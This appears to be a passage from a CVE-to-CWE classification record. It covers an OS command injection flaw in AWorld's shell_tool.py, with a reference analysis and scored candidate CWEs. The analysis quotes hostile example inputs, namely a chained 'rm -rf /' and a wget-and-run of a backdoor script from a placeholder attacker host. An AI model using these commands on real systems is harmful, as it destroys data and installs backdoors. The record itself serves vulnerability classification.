This issue affects the function subprocess.run/subprocess.Popen of the file AWorld/aworld/virtual_environments/terminals/shell_tool.py. The manipulation leads to **os command injection**. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. This product does not use versioning. This is why information about affected and unaffected releases are unavailable.",

  "reference_content": "## CVE-2025-4032 Analysis\n\nThe provided content details a vulnerability report for a potential OS Command Injection in the `shell_tool.py` file within the `inclusionAI/AWorld` GitHub repository. This directly relates to a security issue and provides detailed information about it.\n\n**Root cause of vulnerability:**\n\nThe vulnerability stems from the use of `subprocess.run()` and `subprocess.Popen()` with `shell=True` when executing user-supplied commands. This allows an attacker to inject arbitrary commands into the input string, which are then executed by the system.\n\n**Weaknesses/vulnerabilities present:**\n\n*   **CWE-78: OS Command Injection:** The core vulnerability is a classic OS Command Injection due to unsafe use of shell execution.\n\n**Impact of exploitation:**\n\nSuccessful exploitation could lead to:\n\n*   System damage\n*   Data loss\n*   Unauthorized access to the system (via backdoor installation)\n*   Complete system compromise\n\n**Attack vectors:**\n\n*   An attacker can craft a malicious input string containing shell commands.\n*   The vulnerability is exploitable through any interface where users can input shell commands.\n*   Examples provided include using semicolons (`;`) to chain commands (e.g., `; rm -rf /`) or downloading and executing a backdoor script (e.g., `; wget http://attacker.com/backdoor.sh && sh backdoor.sh`).\n\n**Required attacker capabilities/position:**\n\n*   The attacker needs to be able to provide input to the application that is then passed to the vulnerable `execute` or `execute_async` methods.\n*   No specific privileges are required beyond the ability to provide input.\n\n**Mitigation or fix:**\n\nThe report does not provide a specific fix, but the core mitigation is to **avoid using `shell=True` with `subprocess.run()` and `subprocess.Popen()` when dealing with user-supplied input.** Instead, the input should be properly sanitized and passed as a list of arguments to the subprocess functions.",

This assessment is based directly on the vulnerability description which states \"The manipulation leads to **os command injection**\" and the CVE reference links which confirm this.\n\nThe retriever results also support this, with CWE-78 having the highest score. The graph relationships also influence this, as CWE-78 is a child of CWE-77 (command injection), making it a more specific and accurate classification.\n\n# Enhanced Context (25 CWEs)\nThe following CWEs were identified as potentially relevant to this vulnerability:\n\n## CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n**Abstraction Level**: Base\n**Similarity Score**: 0.76\n**Source**: dense\n\n**Description**:\nThe product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n*Not selected:* This CWE describes exposure of sensitive information, which is a potential *impact* of successful command injection, but not the root cause.\n\n## CWE-116: Improper Encoding or Escaping of Output\n**Abstraction Level**: Class\n**Similarity Score**: 0.75\n**Source**: dense\n\n**Description**:\nThe product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly.
